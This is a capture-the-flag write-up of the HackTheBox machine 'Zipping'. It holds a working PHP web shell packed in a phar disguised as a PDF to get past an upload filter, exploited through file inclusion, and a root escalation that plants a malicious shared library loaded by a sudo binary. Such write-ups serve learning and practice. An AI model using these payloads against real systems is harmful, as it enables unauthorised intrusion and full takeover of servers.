---
title: HTB-Zipping Writeup
date: 2024-01-25 19:40:00 +1000
categories: [HTB, Writeups]
tags: [ctf, htb, box, medium, linux] # TAG names should always be lowercase
image:
  path: /assets/img/ss/x2uv0Zg.png
---
# Zipping Writeup

25 January 2024 

#CTF #HTB #box #medium #linux

## Enumeration

### nmap

```bash
$ sudo nmap -sC -sV -T5 -oA nmap/zipping 10.10.11.229 
Nmap scan report for 10.10.11.229
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.72 seconds
```

### HTTP

We Have two interesting looking web pages `http://10.10.11.229/upload.php`
![img](/assets/img/ss/gfidzGR.png)

The description of this webpage states that it only accepts `ZIP` files containing `PDF`.

Next, there is a `/shop` section that lists various items. Upon clicking on them, a new URL is generated with `page` and `id` parameters.
![img](/assets/img/ss/F1G53bA.png)

![img](/assets/img/ss/uRUeeGl.png)


### File Upload

- Let's try uploading a few `ZIP` files containing `PDF` to gain a basic understanding of how it works.

```bash
touch TEST.pdf
zip pdf.zip TEST.pdf
```

![img](/assets/img/ss/QjJzXGe.png)

- We can see that it has been uploaded successfully at `/uploads/4eb158e645505532e43f3ee7cf29952a/TEST.pdf`.
- from the output we can tell that this is only checking for `.pdf`  file extension.

### File Inclusion

- The `page` parameter in the `/shop/index.php` endpoint might be vulnerable to file inclusion. This could potentially lead to a file inclusion vulnerability, allowing an attacker to include and execute arbitrary files on the server.
![img](/assets/img/ss/AqFwZyB.png)

- It seems like we successfully identified that the ".php" extension is appended to the "page" parameter, and it's likely using a mechanism like "require" or "include" for processing PHP files.

## Foothold

Let's create a file `phar.php`:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php system($_REQUEST["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```


- Executing this file with `PHP` will create an archive called `shell.phar`, which contains a file `shell.php` with the payload above. Then, we have to rename `shell.phar` to have a `.pdf` extension (remember that `/upload.php` only checks the extension inside the zip) and, finally, zip the rogue `PDF` into a legitimate zip archive.

```bash
php --define phar.readonly=0 phar.php
mv shell.phar apple.pdf
zip zipping.zip apple.pdf
```

Let's Upload this `zipping.zip` and copy the path.

![img](/assets/img/ss/noo3E63.png)


Now, by utilizing the `phar://` PHP wrapper, we can seamlessly access files within the `shell.pdf` archive and include `shell.php` for enhanced functionality.

![img](/assets/img/ss/0oPtsWe.png)

It Worked, Let's get a reverse shell:

![img](/assets/img/ss/8lZaFTW.png)

## Privesc

- Our user can run a command as root without the password:
```bash
rektsu@zipping:/var/www/html/shop$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/var/www/html/shop$
```

Let's copy the file to our VM to analyze it with Ghidra.

### Reverse Engineering

The `main()` function starts by asking the user a password:
```c
char user_input[44];
printf("Enter the password: ");
fgets(user_input, 30, stdin);

char *newline_ptr = strchr(user_input, '\n');
if (newline_ptr != NULL) {
	*newline_ptr = '\0';
}

if (!checkAuth(user_input)) {
	puts("Invalid password, please try again.");
	return 1;
}
```

The `checkAuth()` function is just a simple `strcmp()` with a `hardcoded` password:

```c
int checkAuth(char *str) {
	int res = strcmp(str, "St0ckM4nager");
	return res == 0;
}
```

```c
local_e8 = 0x2d17550c0c040967;
local_e0 = 0xe2b4b551c121f0a;
local_d8 = 0x908244a1d000705;
local_d0 = 0x4f19043c0b0f0602;
local_c8 = 0x151a;
local_f0 = 0x657a69616b6148;

XOR((long)&local_e8, 0x22, (long)&local_f0, 8);

local_28 = dlopen(&local_e8, 1);
```

`dlopen()` is a function used to load a shared library at runtime. The path to the library is "decrypted" with the `XOR()` function right before being passed to `dlopen()`.

We could reverse the XOR() function to get the original path

```bash
gef➤  b *main+0x124
Breakpoint 1 at 0x13de

gef➤  r
Starting program: /home/kali/Documents/CTF/Hack_the_box/Machines/Zipping/stock
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the password: St0ckM4nager
[...]

gef➤  x/s $rdi
0x7fffffffdd20: "/home/rektsu/.config/libcounter.so"
```

### Exploitation

- As we can see, it is loading `/home/rektsu/.config/libcounter.so`, but it not there so we can make our own file there

- We can just create the shared library and use __attribute__((constructor)) to execute a function when the library gets loaded by `dlopen()`:

```c
#include <stdlib.h>

__attribute__((constructor))
void init() {
    system("bash");
}
```

compile this with `-shared` flag:

```bash
rektsu@zipping:/home/rektsu/.config$ gcc -shared exp.c -o libcounter.so
```

 After entering the password, we should get a root shell

```bash
rektsu@zipping:/home/rektsu/.config$ sudo stock
Enter the password: St0ckM4nager

root@zipping:/home/rektsu/.config# id
uid=0(root) gid=0(root) groups=0(root)
```

